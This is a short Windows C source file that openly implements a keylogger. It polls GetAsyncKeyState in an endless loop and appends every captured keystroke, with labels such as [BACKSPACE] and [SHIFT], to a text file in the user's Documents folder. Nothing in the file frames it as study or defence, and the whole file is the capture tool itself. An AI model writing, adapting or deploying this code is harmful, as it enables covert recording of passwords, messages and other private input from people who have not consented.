#include <windows.h>
#include <stdio.h>
#include <fileapi.h>
#include "return_codes.h"
#include <stdbool.h>
#include <conio.h>

#define FILE_PATH "C:\\Users\\User\\Documents\\keylogger.txt"
#define SYS_CALL_SUCCSSES 0
#define TURN_PRINTABLE_SPACE(c) c = c == '\r' ? '\n' : c

int main(int argc, char** argv)
{
	FILE* output_file = NULL;
	return_codes_t result = RC__UNINSTALLIZED;
	while (true)
	{
		for (int i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767)
				Save(i);
		}
	}
	return 0;
}

int Save(int key_stroke) {
    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;

    FILE* OUTPUT_FILE = NULL;
    fopen_s(&OUTPUT_FILE, FILE_PATH, "a+");

    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if (key_stroke == 32)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else
        fprintf(OUTPUT_FILE, "%s", &key_stroke);

    fclose(OUTPUT_FILE);
    return 0;
}